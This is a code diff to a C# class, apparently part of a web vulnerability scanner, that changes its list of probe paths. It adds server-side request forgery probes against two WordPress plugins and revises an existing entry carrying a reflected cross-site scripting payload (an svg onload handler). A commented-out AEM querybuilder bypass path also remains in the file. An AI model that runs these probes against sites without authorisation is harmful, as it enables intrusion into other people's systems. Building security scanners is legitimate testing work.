@@ -16,11 +16,24 @@ namespace Clark.Attack.VulnerableFiles
     /// </summary>
     public class Processor : IAttack
     {
-        public string Name = "Vulnerable Files";
+        public string Name { get { return "Vulnerable Files"; } set { } }
 
         #region Private
 
-        private List<VulnerableFile> _vulnerableFiles = new List<VulnerableFile>(){
+        private List<VulnerableFile> _vulnerableFiles = new List<VulnerableFile>()
+        {
+            new VulnerableFile()
+            {
+                File = "wp-content/plugins/qards/html2canvasproxy.php?url=https://google.com",
+                Attacks = new List<string>() { },
+                FingerPrint = new List<string>() { "<title>Google</title>" }
+            },
+            new VulnerableFile()
+            {
+                File = "wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=https://google.com",
+                Attacks = new List<string>() { },
+                FingerPrint = new List<string>() { "<title>Google</title>" }
+            },
             new VulnerableFile()
             {
                 File = "7/0/34/aeb617f1a7b102/curiosity-media.discovery.com/hogarth45.html",
@@ -39,7 +52,7 @@ namespace Clark.Attack.VulnerableFiles
             {
                 File = "f/465/1984/1d/www.ingentaconnect.com/content/jbp/intp/2010/00000012/00000001/art00002?tp=z%22%3E%3Csvg%20onload=window.onerror=n=confirm,n(1234)%3E%3C/svg%3Ebwgjq&a=directorio&d=0003300-2009-05-26.php",
                 Attacks = new List<string>() { },
-                FingerPrint = new List<string>() { "n(1234)" }
+                FingerPrint = new List<string>() { "n(1234)></svg>" }
             },
 
             /////bin///querybuilder.json.servlet;%0aa.css?path=/home&p.hits=full&p.limit=-1
@@ -125,7 +138,7 @@ namespace Clark.Attack.VulnerableFiles
             //    }
             //});
 
-        }
+        };
 
         #endregion
 
@@ -165,7 +178,7 @@ namespace Clark.Attack.VulnerableFiles
                     string attackString = vuln.Attacks.FirstOrDefault();
                     if (!String.IsNullOrEmpty(attackString))
                         testedFile = testedFile + attackString;
-                    result.Results.Add(attackString);
+                    result.Results.Enqueue(testedFile);
                 }
             }
         }
